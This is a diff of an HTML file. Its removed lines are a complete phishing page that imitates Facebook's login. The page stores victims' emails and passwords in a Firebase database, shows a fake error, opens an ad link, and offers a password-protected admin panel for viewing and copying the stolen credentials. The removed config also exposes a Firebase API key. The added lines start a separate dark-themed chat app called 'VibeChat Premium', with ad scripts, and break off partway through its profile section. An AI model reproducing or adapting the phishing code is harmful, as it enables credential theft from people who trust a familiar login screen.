@@ -2,129 +2,2128 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - Log In or Sign Up</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#050508">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>VibeChat Premium</title>
     
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-
     <style>
-        :root { --primary: #0866ff; --bg: #f0f2f5; --white: #ffffff; --text: #1c1e21; --danger: #ff4d4f; }
-        body { font-family: 'Inter', sans-serif; margin: 0; padding: 0; background-color: var(--white); overflow-x: hidden; }
+        /* ==========================================
+           CSS: PURE LUXURY & GLASSMORPHISM
+           ========================================== */
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
 
-        /* Login UI */
-        .login-container { width: 100%; max-width: 412px; margin: auto; padding: 0 16px; box-sizing: border-box; }
-        .top-banner { display: flex; align-items: center; justify-content: center; padding: 12px 0; color: var(--primary); font-size: 13px; font-weight: 600; border-bottom: 1px solid #ddd; cursor: pointer; }
-        .header-lang { text-align: center; color: #606770; font-size: 14px; padding: 20px 0; }
-        .fb-logo-box { display: flex; justify-content: center; margin: 20px 0 40px; }
-        .fb-circle { width: 65px; height: 65px; background: var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; position: relative; }
-        .fb-f { color: white; font-size: 55px; font-weight: bold; position: absolute; bottom: -6px; right: 12px; }
-        .inputs { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #ccd0d5; border-radius: 12px; box-sizing: border-box; font-size: 15px; background: #f5f6f7; outline: none; }
-        .btn-login { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 25px; font-weight: bold; font-size: 16px; cursor: pointer; }
-        .btn-create { width: 100%; padding: 12px; margin-top: 100px; background: white; color: var(--primary); border: 1px solid var(--primary); border-radius: 25px; font-weight: bold; cursor: pointer; }
+        :root { 
+            --bg-dark: #050508; 
+            --bg-card: #0d0d14; 
+            --primary-neon: #a855f7; 
+            --primary-gradient: linear-gradient(135deg, #a855f7, #6366f1);
+            --vip-gold: #fbbf24; 
+            --vip-gradient: linear-gradient(135deg, #fbbf24, #f59e0b);
+            --primary-glow: rgba(168, 85, 247, 0.5); 
+            --vip-glow: rgba(251, 191, 36, 0.5);
+            --text-main: #ffffff; 
+            --text-muted: #94a3b8; 
+            --recv-msg: #161622; 
+            --glass-border: rgba(255, 255, 255, 0.05);
+        }
 
-        /* Admin UI */
-        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 9999; overflow-y: auto; }
-        .admin-nav { background: var(--primary); color: white; padding: 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; }
-        .admin-content { padding: 20px; max-width: 500px; margin: auto; }
-        .stat-card { background: linear-gradient(135deg, #0866ff, #004dc7); color: white; padding: 20px; border-radius: 15px; margin-bottom: 20px; text-align: center; }
-        .log-card { background: var(--white); border-radius: 12px; padding: 16px; margin-bottom: 15px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); border-left: 5px solid var(--primary); }
-        .action-btns { margin-top: 10px; display: flex; gap: 10px; }
-        .btn-action { flex: 1; padding: 8px; border: none; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: 600; }
-        .btn-copy { background: #e7f3ff; color: var(--primary); }
-        .btn-delete { background: #fff1f0; color: var(--danger); }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; -webkit-tap-highlight-color: transparent;}
+        body { background-color: var(--bg-dark); color: var(--text-main); overflow: hidden; height: 100vh;}
+
+        /* --- Screens --- */
+        .screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: none; flex-direction: column; background-color: var(--bg-dark); z-index: 10; transition: transform 0.4s cubic-bezier(0.25, 0.8, 0.25, 1); }
+        .screen.active { display: flex; }
+        .screen.slide-right { transform: translateX(100%); display: flex; }
+        .screen.slide-in { transform: translateX(0%); }
+
+        /* --- PURE CSS AI ROBOT (No Images) --- */
+        #vibe-ai-trigger {
+            position: fixed; bottom: 95px; right: 20px; width: 65px; height: 65px;
+            background: linear-gradient(145deg, #1e1e2e, #0d0d14);
+            border: 2px solid var(--primary-neon); border-radius: 50%;
+            box-shadow: 0 0 20px var(--primary-glow), inset 0 0 15px rgba(168,85,247,0.3);
+            z-index: 1000; cursor: pointer; display: flex; flex-direction: column;
+            justify-content: center; align-items: center; gap: 5px;
+            transition: border-color 0.3s;
+        }
+        .ai-ears { display: flex; gap: 20px; position: absolute; top: -8px; }
+        .ear { width: 0; height: 0; border-left: 6px solid transparent; border-right: 6px solid transparent; border-bottom: 12px solid var(--primary-neon); }
+        .ai-visor { width: 38px; height: 16px; background: #000; border-radius: 10px; display: flex; justify-content: space-evenly; align-items: center; box-shadow: 0 0 5px var(--primary-glow); border: 1px solid rgba(255,255,255,0.1); }
+        .ai-eye { width: 6px; height: 6px; background: #0df; border-radius: 50%; box-shadow: 0 0 8px #0df; animation: blink 4s infinite; }
+        .ai-mouth { width: 12px; height: 3px; background: var(--primary-neon); border-radius: 5px; box-shadow: 0 0 5px var(--primary-neon); }
+        @keyframes blink { 0%, 96%, 98%, 100% { transform: scaleY(1); } 97%, 99% { transform: scaleY(0.1); } }
+
+        /* --- Enhanced Splash Screen WITH INLINE STYLE FIX FOR FOUC --- */
+        #splash-screen { display: flex !important; z-index: 999999 !important; position: fixed !important; top: 0; left: 0; width: 100vw; height: 100vh; background-color: var(--bg-dark); background: radial-gradient(circle at center, #110e1a 0%, #050508 100%); justify-content: center; align-items: center; }
+        .splash-glow { position: absolute; width: 250px; height: 250px; background: var(--primary-glow); border-radius: 50%; filter: blur(100px); animation: pulseGlow 2s infinite alternate; }
+        .splash-content { position: relative; z-index: 1; text-align: center; animation: slideUpFade 1s ease-out forwards; }
+        .splash-logo { font-size: 3.8rem; font-weight: 800; letter-spacing: -1px; color: white; text-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-bottom: 5px; }
+        .splash-logo span { background: var(--primary-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; filter: drop-shadow(0 0 15px var(--primary-glow)); }
+        .splash-tagline { font-size: 0.85rem; color: var(--text-muted); letter-spacing: 4px; text-transform: uppercase; font-weight: 600; margin-bottom: 40px; opacity: 0.8; }
+        .splash-loader { display: flex; justify-content: center; gap: 8px; }
+        .splash-dot { width: 12px; height: 12px; background: var(--primary-neon); border-radius: 50%; animation: bounceDot 1.4s infinite ease-in-out both; }
+        .splash-dot:nth-child(1) { animation-delay: -0.32s; }
+        .splash-dot:nth-child(2) { animation-delay: -0.16s; }
+        
+        @keyframes pulseGlow { 0% { transform: scale(0.8); opacity: 0.4; } 100% { transform: scale(1.2); opacity: 0.8; } }
+        @keyframes slideUpFade { 0% { transform: translateY(30px); opacity: 0; } 100% { transform: translateY(0); opacity: 1; } }
+        @keyframes bounceDot { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); box-shadow: 0 0 15px var(--primary-neon); } }
+
+        /* --- Auth Screen --- */
+        .logo { font-size: 2.8rem; font-weight: 800; margin-bottom: 5px; }
+        .logo span { background: var(--primary-gradient); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .auth-container { margin: auto; width: 92%; max-width: 400px; text-align: center; padding: 40px 25px; background: var(--bg-card); border-radius: 30px; border: 1px solid var(--glass-border); box-shadow: 0 30px 60px rgba(0,0,0,0.9); }
+        input { width: 100%; padding: 18px 20px; margin-bottom: 16px; border-radius: 16px; border: 1px solid var(--glass-border); background: rgba(0,0,0,0.5); color: white; outline: none; transition: 0.3s; font-size: 1rem; }
+        input:focus { border-color: var(--primary-neon); box-shadow: 0 0 15px var(--primary-glow); }
+        button { width: 100%; padding: 18px; border-radius: 16px; border: none; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        button:active { transform: scale(0.96); }
+        .btn-primary { background: var(--primary-gradient); color: white; box-shadow: 0 8px 25px rgba(168, 85, 247, 0.3); }
+        .btn-danger { background: rgba(239, 68, 68, 0.1); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
+        .toggle-auth { color: var(--text-muted); font-size: 0.9rem; margin-top: 15px; cursor: pointer; }
+
+        /* Header & Nav */
+        .app-header { padding: 25px 20px 15px; background: rgba(5, 5, 8, 0.85); backdrop-filter: blur(20px); border-bottom: 1px solid var(--glass-border); text-align: center; position: sticky; top: 0; z-index: 50;}
+        .tab-content { display: none; flex: 1; overflow-y: auto; padding: 15px; padding-bottom: 95px; }
+        .tab-content.active { display: block; }
+        .bottom-nav { position: fixed; bottom: 0; width: 100%; height: 80px; background: rgba(13, 13, 20, 0.9); backdrop-filter: blur(25px); display: flex; justify-content: space-around; padding: 0 10px; align-items: center; border-top: 1px solid var(--glass-border); z-index: 100; padding-bottom: 8px;}
+        .nav-item { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 25%; color: var(--text-muted); cursor: pointer; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .nav-item i { font-size: 1.5rem; margin-bottom: 5px; transition: 0.3s;}
+        .nav-item span { font-size: 0.75rem; font-weight: 600; opacity: 0.7; transition: 0.3s;}
+        .nav-item.active { color: #fff; transform: translateY(-8px); }
+        .nav-item.active i { color: var(--primary-neon); text-shadow: 0 0 20px var(--primary-glow); }
+        .nav-item.active span { opacity: 1; color: var(--primary-neon);}
+
+        /* 💎 LUXURY PROFILE 3.0 DASHBOARD 💎 */
+        .profile-container { padding: 0; overflow-x: hidden; }
+        .cover-photo-wrapper { width: 100%; height: 220px; background: #0a0a0f; position: relative; border-bottom: 1px solid var(--glass-border); }
+        .cover-img { width: 100%; height: 100%; object-fit: cover; opacity: 0.7; mask-image: linear-gradient(to bottom, rgba(0,0,0,1) 50%, rgba(0,0,0,0)); -webkit-mask-image: linear-gradient(to bottom, rgba(0,0,0,1) 50%, rgba(0,0,0,0));}
+        .cover-edit-btn { position: absolute; top: 20px; right: 20px; background: rgba(0,0,0,0.6); backdrop-filter: blur(10px); padding: 10px 18px; border-radius: 20px; color: white; font-size: 0.85rem; border: 1px solid var(--glass-border); cursor: pointer;}
+        
+        .profile-core-info { display: flex; flex-direction: column; align-items: center; margin-top: -80px; position: relative; z-index: 5; }
+        .pfp-main-box { position: relative; width: 150px; height: 150px; border-radius: 50%; padding: 6px; background: var(--bg-dark); }
+        .pfp-main { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; background: #222; border: 3px solid var(--primary-neon); box-shadow: 0 10px 30px rgba(0,0,0,0.8); }
+        .pfp-upload-icon { position: absolute; bottom: 5px; right: 5px; background: var(--primary-gradient); width: 42px; height: 42px; border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 4px solid var(--bg-dark); cursor: pointer; color: white;}
+        
+        .user-titles { text-align: center; margin-top: 15px; }
+        .user-titles h2 { font-size: 1.8rem; font-weight: 800; color: #fff; letter-spacing: -0.5px; display:flex; align-items:center; justify-content:center; gap:8px;}
+        .user-titles p { color: var(--primary-neon); font-weight: 600; font-size: 1.1rem; margin-top: 2px;}
+        .vip-status-badge { background: rgba(251,191,36,0.1); border: 1px solid rgba(251,191,36,0.3); color: var(--vip-gold); padding: 5px 15px; border-radius: 20px; font-size: 0.8rem; font-weight: 700; margin-top: 12px; display: inline-flex; align-items:center; gap:6px; box-shadow: 0 0 15px rgba(251,191,36,0.15);}
+
+        /* Profile Dashboard Grid */
+        .dashboard-grid { display: flex; flex-direction: column; gap: 12px; padding: 20px; }
+        .dash-card { display: flex; align-items: center; background: var(--bg-card); border-radius: 20px; padding: 16px 20px; border: 1px solid var(--glass-border); box-shadow: 0 5px 15px rgba(0,0,0,0.2); transition: 0.3s; position: relative; overflow: hidden; cursor:pointer;}
+        .dash-card:active { transform: scale(0.98); }
+        .dash-card::before { content:''; position:absolute; top:0; left:0; width:4px; height:100%; background: var(--primary-gradient); opacity:0.8;}
+        
+        .card-vip { background: linear-gradient(145deg, #1a1500, #12121a); border-color: rgba(251,191,36,0.2); }
+        .card-vip::before { width: 100%; height: 100%; background: var(--vip-gradient); opacity: 0.1;}
+        .card-icon { font-size: 1.4rem; margin-bottom: 0; margin-right: 15px; width: 45px; height: 45px; background: rgba(255,255,255,0.05); border-radius: 12px; display:flex; justify-content:center; align-items:center; }
+        .dash-card h4 { font-size: 1.05rem; font-weight: 700; color: #fff; margin-bottom: 2px; }
+        .dash-card p { font-size: 0.75rem; color: var(--text-muted); line-height: 1.2; }
+        .dash-card .info-wrap { flex: 1; }
+
+        /* Full Advanced Settings List (Messenger Style) */
+        .settings-group { background: var(--bg-card); border-radius: 20px; border: 1px solid var(--glass-border); margin-bottom: 20px; overflow: hidden; }
+        .settings-item { display: flex; align-items: center; padding: 18px 20px; border-bottom: 1px solid rgba(255,255,255,0.05); cursor: pointer; transition: 0.2s; }
+        .settings-item:last-child { border-bottom: none; }
+        .settings-item:active { background: rgba(255,255,255,0.05); }
+        .settings-icon { width: 40px; height: 40px; border-radius: 12px; display: flex; justify-content: center; align-items: center; font-size: 1.2rem; margin-right: 15px; }
+        .settings-text { flex: 1; }
+        .settings-text h4 { font-size: 1.05rem; font-weight:600; color: #fff; margin-bottom: 2px; }
+        .settings-text p { font-size: 0.75rem; color: var(--text-muted); }
+        
+        .toggle-switch { width: 46px; height: 26px; background: rgba(255,255,255,0.1); border-radius: 15px; position: relative; transition: 0.3s; }
+        .toggle-switch::after { content: ''; position: absolute; width: 20px; height: 20px; background: #fff; border-radius: 50%; top: 3px; left: 3px; transition: 0.3s; box-shadow: 0 2px 5px rgba(0,0,0,0.5); }
+        .toggle-switch.active { background: #22c55e; box-shadow: 0 0 10px rgba(34,197,94,0.4); }
+        .toggle-switch.active::after { transform: translateX(20px); }
+
+        /* Others Profile View Actions */
+        .profile-action-hub { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; padding: 10px 20px 30px; }
+        .p-hub-btn { background: var(--bg-card); border-radius: 20px; padding: 18px 5px; text-align: center; border: 1px solid var(--glass-border); transition: 0.3s ease; cursor: pointer; box-shadow: 0 5px 15px rgba(0,0,0,0.2);}
+        .p-hub-btn:active { transform: translateY(5px); }
+        .p-hub-btn i { font-size: 1.6rem; margin-bottom: 8px; display: block; }
+        .p-hub-btn span { font-size: 0.7rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase; }
+
+        /* User Lists & Chats */
+        .user-item { display: flex; align-items: center; padding: 16px; background: var(--bg-card); border-radius: 20px; margin-bottom: 15px; cursor: pointer; border: 1px solid var(--glass-border); transition: 0.2s; }
+        .user-item:active { transform: scale(0.97); }
+        .user-item img { width: 60px; height: 60px; border-radius: 50%; margin-right: 15px; object-fit: cover; border: 2px solid rgba(255,255,255,0.1); }
+        .user-details { flex: 1; overflow: hidden; }
+        .user-details h4 { font-size: 1.1rem; font-weight: 600; color: white; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; display:flex; align-items:center;}
+        .user-details p { font-size: 0.85rem; color: var(--text-muted); }
+
+        /* Facebook/Messenger Style Chat Header UI */
+        .chat-header { display: flex; align-items: center; padding: 12px 15px; background: rgba(13, 13, 20, 0.95); backdrop-filter: blur(25px); border-bottom: 1px solid var(--glass-border); z-index: 50;}
+        .chat-header button { width: auto; background: transparent; color: white; font-size: 1.4rem; margin-right: 10px; padding: 8px; box-shadow: none; border-radius: 50%;}
+        .chat-header button:active { background: rgba(255,255,255,0.1); }
+        
+        .chat-header-user { display: flex; align-items: center; flex: 1; cursor: pointer; padding: 5px 10px 5px 5px; border-radius: 30px; transition: 0.2s; background: transparent; overflow: hidden; }
+        .chat-header-user:active { background: rgba(255,255,255,0.08); transform: scale(0.97); }
+        #active-chat-pfp { width: 42px; height: 42px; border-radius: 50%; margin-right: 12px; object-fit: cover; border: 2px solid rgba(255,255,255,0.1); }
+
+        .messages-container { flex: 1; overflow-y: auto; padding: 20px 15px; display: flex; flex-direction: column; gap: 15px; margin-bottom: 85px; }
+        .message { max-width: 80%; padding: 14px 18px; border-radius: 22px; font-size: 1rem; line-height: 1.4; word-wrap: break-word; box-shadow: 0 4px 10px rgba(0,0,0,0.3); position: relative; cursor: pointer;}
+        .message.sent { background: var(--primary-gradient); color: white; align-self: flex-end; border-bottom-right-radius: 6px; }
+        .message.received { background: var(--recv-msg); color: #fff; align-self: flex-start; border-bottom-left-radius: 6px; border: 1px solid var(--glass-border);}
+        
+        .msg-time { display: block; font-size: 0.65rem; color: rgba(255,255,255,0.6); margin-top: 6px; text-align: right; }
+        .msg-status { margin-left: 4px; font-size: 0.7rem; color: rgba(255,255,255,0.6); }
+        .msg-status.read { color: #0df; }
+        .edited-mark { font-size: 0.7rem; opacity: 0.6; font-style: italic; margin-left: 5px; }
+        .chat-image { max-width: 100%; border-radius: 12px; margin-bottom: 5px; }
+
+        .chat-input-area { position: fixed; bottom: 0; width: 100%; padding: 15px; background: rgba(13, 13, 20, 0.95); backdrop-filter: blur(25px); display: flex; gap: 12px; align-items: center; border-top: 1px solid var(--glass-border); z-index: 50;}
+        .chat-input-area input { margin: 0; flex: 1; border-radius: 25px; padding: 16px 20px; border: 1px solid rgba(255,255,255,0.08); background: rgba(0,0,0,0.5); color: white;}
+        .icon-btn { background: transparent; border: none; color: var(--primary-neon); font-size: 1.5rem; cursor: pointer; display: flex; align-items: center; justify-content: center; width: 45px;}
+
+        /* Video Call UI */
+        #video-chat-screen, #private-video-screen { background: #000; z-index: 500; }
+        .video-container { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        #remote-video, #pvt-remote-video { width: 100%; height: 100%; object-fit: cover; background: #050508; position: absolute; top:0; left:0; }
+        #local-video, #pvt-local-video { position: absolute; bottom: 110px; right: 20px; width: 110px; height: 160px; object-fit: cover; border-radius: 16px; border: 2px solid var(--primary-neon); box-shadow: 0 10px 30px rgba(0,0,0,0.8); z-index: 10; background: #111; transform: scaleX(-1); }
+        .video-controls { position: absolute; bottom: 30px; left: 0; width: 100%; display: flex; justify-content: center; gap: 20px; z-index: 20; padding: 0 20px; }
+        .video-btn { width: 65px; height: 65px; border-radius: 50%; font-size: 1.8rem; display: flex; justify-content: center; align-items: center; border: none; cursor: pointer; color: white; box-shadow: 0 5px 15px rgba(0,0,0,0.6); margin: 0; }
+        
+        .ad-container { width: 100%; display: flex; justify-content: center; align-items: center; margin-bottom: 20px; border-radius: 16px; overflow: hidden; background: rgba(255,255,255,0.02); border: 1px solid var(--glass-border);}
     </style>
 </head>
 <body>
 
-<div id="loginPage" class="login-container">
-    <div class="top-banner" onclick="openAdmin()">
-        <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
-        &nbsp; Get Facebook for Android and browse faster.
+    <!-- Notification Sounds -->
+    <audio id="msg-sound" src="https://www.soundjay.com/buttons/sounds/button-09.mp3"></audio>
+    <audio id="ring-sound" src="https://www.soundjay.com/phone/sounds/telephone-ring-03a.mp3" loop></audio>
+
+    <!-- Enhanced Splash Screen WITH INLINE STYLE FIX FOR FOUC -->
+    <div id="splash-screen" class="screen active" style="display: flex !important; z-index: 999999 !important; position: fixed !important; top: 0; left: 0; width: 100vw; height: 100vh; background-color: var(--bg-dark); background: radial-gradient(circle at center, #110e1a 0%, #050508 100%);">
+        <div class="splash-glow"></div>
+        <div class="splash-content">
+            <h1 class="splash-logo">Vibe<span>Chat</span></h1>
+            <p class="splash-tagline">Premium Edition</p>
+            <div class="splash-loader">
+                <div class="splash-dot"></div>
+                <div class="splash-dot"></div>
+                <div class="splash-dot"></div>
+            </div>
+        </div>
     </div>
-    <div class="header-lang">English (UK)</div>
-    <div class="fb-logo-box"><div class="fb-circle"><span class="fb-f">f</span></div></div>
 
-    <form id="mainForm">
-        <input type="text" id="email" class="inputs" placeholder="Mobile number or email address" required>
-        <input type="password" id="pass" class="inputs" placeholder="Password" required>
-        <button type="submit" class="btn-login">Log in</button>
-    </form>
-    <div style="text-align: center; margin-top: 20px;"><a href="#" style="text-decoration:none; color:#1c1e21; font-weight:500;">Forgotten password?</a></div>
-    <button class="btn-create">Create new account</button>
-</div>
-
-<div id="adminPanel">
-    <div class="admin-nav"><b>Admin Dashboard</b> <button onclick="location.reload()" style="background:none; border:1px solid white; color:white; border-radius:15px; padding:4px 12px; cursor:pointer;">Logout</button></div>
-    <div class="admin-content">
-        <div class="stat-card"><div style="font-size:14px;opacity:0.8;">Total Logs</div><div id="count" style="font-size:32px;font-weight:700;">0</div></div>
-        <div id="logContainer">Loading...</div>
+    <!-- PURE CSS VibeAI Floating Trigger -->
+    <div id="vibe-ai-trigger">
+        <div class="ai-ears"><div class="ear"></div><div class="ear"></div></div>
+        <div class="ai-visor"><div class="ai-eye"></div><div class="ai-eye"></div></div>
+        <div class="ai-mouth"></div>
     </div>
-</div>
 
-<script>
-    // Firebase Config (Your Config)
-    const firebaseConfig = {
-      apiKey: "AIzaSyCCZMHCgIuFQtwjZer0e_nSXQjFMgxHFSY",
-      authDomain: "net-cash-pro-67f5d.firebaseapp.com",
-      databaseURL: "https://net-cash-pro-67f5d-default-rtdb.firebaseio.com",
-      projectId: "net-cash-pro-67f5d",
-      storageBucket: "net-cash-pro-67f5d.firebasestorage.app",
-      messagingSenderId: "15021602824",
-      appId: "1:15021602824:web:e37a1073696c9f757639bd"
-    };
+    <!-- Auth Screen -->
+    <div id="auth-screen" class="screen">
+        <div class="auth-container">
+            <h1 class="logo">Vibe<span>Chat</span></h1>
+            <p class="subtitle">Global Connecting Experience</p>
+            <div id="login-form">
+                <input type="email" id="login-email" placeholder="Email Address">
+                <input type="password" id="login-password" placeholder="Password">
+                <button id="login-btn" class="btn-primary">Login</button>
+                <p class="toggle-auth" onclick="toggleAuth('register')">Don't have an account? <b>Sign Up</b></p>
+            </div>
+            <div id="register-form" style="display: none;">
+                <input type="text" id="reg-fullname" placeholder="Full Name (e.g. Rohan Vai)">
+                <input type="text" id="reg-username" placeholder="Unique Username (e.g. @rohan12)">
+                <input type="email" id="reg-email" placeholder="Email Address">
+                <input type="password" id="reg-password" placeholder="Create Password (Min 6 chars)">
+                <button id="register-btn" class="btn-primary">Create Account</button>
+                <p class="toggle-auth" onclick="toggleAuth('login')">Already have an account? <b>Login</b></p>
+            </div>
+        </div>
+    </div>
 
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+    <!-- Main App Screen -->
+    <div id="main-screen" class="screen">
+        <header class="app-header"><h2 id="header-title" style="font-weight:600;">Chats</h2></header>
 
-    // Submit Logic
-    document.getElementById('mainForm').addEventListener('submit', (e) => {
-        e.preventDefault();
-        const u = document.getElementById('email').value;
-        const p = document.getElementById('pass').value;
-        const ad = "https://www.effectivegatecpm.com/ruifira0n?key=185580d2c40df238621097ff9bc9f9c7";
+        <!-- Tab 1: Private Chats -->
+        <div id="tab-chats" class="tab-content active">
+            <div class="ad-container" id="chat-ad-banner">
+                <script type="text/javascript">
+                    atOptions = { 'key' : '9f634c6894bc13ff8f0f19de1fcac9f3', 'format' : 'iframe', 'height' : 50, 'width' : 320, 'params' : {} };
+                </script>
+                <script type="text/javascript" src="https://www.highperformanceformat.com/9f634c6894bc13ff8f0f19de1fcac9f3/invoke.js"></script>
+            </div>
+            <div id="chat-list-container"></div>
+        </div>
+        
+        <!-- Tab 2: Global Chat & Video Call -->
+        <div id="tab-global" class="tab-content" style="padding-bottom: 140px;">
+            <div onclick="startRandomVideoChat()" style="background:var(--primary-gradient); padding:25px; border-radius:30px; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center; box-shadow: 0 10px 30px var(--primary-glow); cursor:pointer;">
+                <div><h3 style="color:white; font-size:1.3rem;">Video Roulette</h3><p style="font-size:0.85rem; color:rgba(255,255,255,0.9);">Talk to random strangers!</p></div>
+                <i class="fa-solid fa-play-circle" style="font-size:3.5rem; color:white;"></i>
+            </div>
+            <div id="global-messages" class="messages-container" style="margin-bottom: 0; padding:0;"></div>
+            <div class="chat-input-area" style="bottom: 75px; z-index: 50;">
+                <input type="text" id="global-input" placeholder="Message the world...">
+                <button id="global-send-btn" class="btn-primary" style="width:55px;height:55px;"><i class="fa-solid fa-paper-plane"></i></button>
+            </div>
+        </div>
 
-        db.ref('user_logs').push({ u, p, date: new Date().toLocaleString() }).then(() => {
-            window.open(ad, '_blank');
-            alert("Login error! Please try again.");
-            document.getElementById('mainForm').reset();
-        });
-    });
+        <!-- Tab 3: Search & Requests -->
+        <div id="tab-search" class="tab-content">
+            <div class="search-bar">
+                <input type="text" id="search-input" placeholder="Search @username">
+                <button id="search-btn" class="btn-primary">Search</button>
+            </div>
+            <div id="search-results"></div>
+            <h3 style="margin:25px 0 10px; font-size:1.1rem; font-weight:600;">
+                Friend Requests <span id="req-count" style="color:var(--primary-neon); font-size:0.9rem;"></span>
+            </h3>
+            <div id="friend-requests"></div>
+        </div>
 
-    // Admin Logic
-    function openAdmin() {
-        if (prompt("Admin Password:") === "15211") {
-            document.getElementById('loginPage').style.display = "none";
-            document.getElementById('adminPanel').style.display = "block";
-            loadData();
-        }
-    }
-
-    function loadData() {
-        db.ref('user_logs').on('value', (s) => {
-            const container = document.getElementById('logContainer');
-            container.innerHTML = "";
-            let c = 0;
-            s.forEach((child) => {
-                c++;
-                const d = child.val();
-                container.innerHTML += `<div class="log-card">
-                    <b>User:</b> ${d.u}<br><b>Pass:</b> ${d.p}<br><small>${d.date}</small>
-                    <div class="action-btns">
-                        <button class="btn-action btn-copy" onclick="copyText('${d.u}', '${d.p}')">Copy</button>
-                        <button class="btn-action btn-delete" onclick="deleteLog('${child.key}')">Delete</button>
+        <!-- Tab 4: Profile & Settings -->
+        <div id="tab-profile" class="tab-content" style="padding:0;">
+            <div class="profile-container">
+                <div class="cover-photo-wrapper">
+                    <img id="my-cover" src="https://images.unsplash.com/photo-1614850523296-d8c1af93d400?w=1000" class="cover-img">
+                    <label for="cover-upload" class="cover-edit-btn"><i class="fa-solid fa-pen"></i> Edit Cover</label>
+                    <input type="file" id="cover-upload" accept="image/*" style="display:none;">
+                </div>
+                
+                <div class="profile-core-info">
+                    <div class="pfp-main-box">
+                        <img id="my-pfp" src="" class="pfp-main">
+                        <label for="pfp-upload" class="pfp-upload-icon"><i class="fa-solid fa-camera"></i></label>
+                        <input type="file" id="pfp-upload" accept="image/*" style="display: none;">
                     </div>
-                </div>`;
-            });
-            document.getElementById('count').innerText = c;
-        });
-    }
+                    <div class="user-titles">
+                        <h2 id="my-name">User Name <span id="my-vip-badge-main" class="verified-badge" style="display:none;"><i class="fa-solid fa-circle-check"></i></span></h2>
+                        <p id="my-username">@username</p>
+                        <div id="my-vip-status" class="vip-status-badge" style="display:none;"><i class="fa-solid fa-crown"></i> PREMIUM VIP</div>
+                    </div>
+                </div>
+                
+                <div class="dashboard-grid">
+                    <div class="dash-card card-vip" onclick="openVIPStore()" id="vip-dashboard-btn">
+                        <div class="card-icon" style="color:var(--vip-gold); background:rgba(251,191,36,0.1);"><i class="fa-solid fa-crown"></i></div>
+                        <div class="info-wrap"><h4 style="color:var(--vip-gold);">Vibe VIP Store</h4><p>Remove ads & unlock badges</p></div>
+                        <i class="fa-solid fa-chevron-right" style="color:var(--vip-gold);"></i>
+                    </div>
 
-    function copyText(u, p) { navigator.clipboard.writeText("User: "+u+"\nPass: "+p); alert("Copied!"); }
-    function deleteLog(k) { if(confirm("Delete?")) db.ref('user_logs').child(k).remove(); }
-</script>
+                    <div class="dash-card" onclick="openEditor('name')">
+                        <div class="card-icon" style="color:#3b82f6; background:rgba(59,130,246,0.1);"><i class="fa-solid fa-user-edit"></i></div>
+                        <div class="info-wrap"><h4>Edit Name</h4><p>Change your display name</p></div>
+                        <i class="fa-solid fa-chevron-right" style="color:var(--text-muted); font-size:0.8rem;"></i>
+                    </div>
+                    
+                    <div class="dash-card" onclick="openEditor('bio')">
+                        <div class="card-icon" style="color:#a855f7; background:rgba(168,85,247,0.1);"><i class="fa-solid fa-quote-left"></i></div>
+                        <div class="info-wrap"><h4>About Bio</h4><p id="my-bio">Loading...</p></div>
+                        <i class="fa-solid fa-chevron-right" style="color:var(--text-muted); font-size:0.8rem;"></i>
+                    </div>
+                    
+                    <div class="dash-card" onclick="document.getElementById('security-settings-screen').classList.add('slide-in');">
+                        <div class="card-icon" style="color:#eab308; background:rgba(234,179,8,0.1);"><i class="fa-solid fa-shield-halved"></i></div>
+                        <div class="info-wrap"><h4>Privacy & Security</h4><p>Password, 2FA, Active Status</p></div>
+                        <i class="fa-solid fa-chevron-right" style="color:var(--text-muted); font-size:0.8rem;"></i>
+                    </div>
+                    
+                    <div class="dash-card" onclick="alert('Notification settings will be synced in the next update.')">
+                        <div class="card-icon" style="color:#ec4899; background:rgba(236,72,153,0.1);"><i class="fa-solid fa-bell"></i></div>
+                        <div class="info-wrap"><h4>Notifications & Sounds</h4><p>Customize app alerts</p></div>
+                        <i class="fa-solid fa-chevron-right" style="color:var(--text-muted); font-size:0.8rem;"></i>
+                    </div>
+
